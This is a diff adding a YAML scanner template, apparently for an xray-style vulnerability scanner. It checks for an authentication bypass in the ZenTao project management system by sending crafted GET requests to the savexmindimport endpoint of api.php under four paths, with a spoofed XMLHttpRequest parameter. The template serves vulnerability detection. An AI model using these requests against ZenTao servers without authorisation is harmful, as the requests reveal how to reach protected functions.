@@ -1,0 +1,27 @@
+name: zentao-auth-bypass
+groups:
+  path1:
+    - method: GET
+      path: "/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=test&branch=test"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"error") || response.body.bcontains(b"code"))
+  path2:
+    - method: GET
+      path: "/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=test&branch=test"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"error") || response.body.bcontains(b"code"))
+  path3:
+    - method: GET
+      path: "/biz/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=test&branch=test"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"error") || response.body.bcontains(b"code"))
+  path4:
+    - method: GET
+      path: "/max/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=test&branch=test"
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"error") || response.body.bcontains(b"code"))
+detail:
+  author: lxy
+  links:
+    - https://mp.weixin.qq.com/s/hiGI_fQmXOHdkPqn6x00Jw
+  description: "禅道项目管理系统身份认证绕过漏洞"
